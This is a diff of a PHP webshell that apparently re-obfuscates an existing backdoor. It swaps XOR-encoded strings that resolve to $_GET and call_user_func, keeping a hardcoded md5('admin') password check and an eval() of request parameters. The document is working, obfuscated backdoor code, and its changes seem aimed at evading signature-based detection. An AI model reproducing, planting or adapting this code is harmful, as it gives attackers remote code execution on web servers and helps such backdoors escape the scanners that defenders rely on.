@@ -1,6 +1,6 @@
 
 <?php
-$a = ${"c% #"^"<bew"}[1];
+$a = ${"j$/("^"5cj|"}[1];
 
 //  1 is md5('admin'). You can have on your own.
 if(md5($a)=='21232f297a57a5a743894a0e4a801fc3')
@@ -27,7 +27,7 @@ if(md5($a)=='21232f297a57a5a743894a0e4a801fc3')
     $func=$arr[0];
     $params=$arr[1];
 	class C{public function __invoke($p) {eval($p."");}};
-	$t = "??&)i\\#_?e=;^("^"\\^JE6)P:M:[N0K";
+	$t = ">[%-d>=;:j\\;-="^"]:IA;KN^H5:NC^";
     @${'t'}(new C(),$params);
   
   
